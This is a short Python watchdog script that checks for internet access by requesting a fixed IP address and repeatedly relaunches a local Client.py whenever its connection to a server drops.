import os
import subprocess
import Client
import time
import requests
import sys
from threading import Thread
def internet_on():
    try:
        requests.get('http://216.58.192.142')
        return True
    except:
        return False

try:
    os.remove("tmp.txt")
    print('removing tmp.txt')
except:
    pass


if __name__ == '__main__':
    while True:
        if os.path.isfile("tmp.txt"):
            print('tmp.txt found')
        else:
            internet_on()
            if internet_on() == True:
                subprocess.call(['python.exe', 'Client.py'])
                print('Connection lost to server Restarting program')
            else:
                print('Waiting for connection to the internet...')
                time.sleep(5)
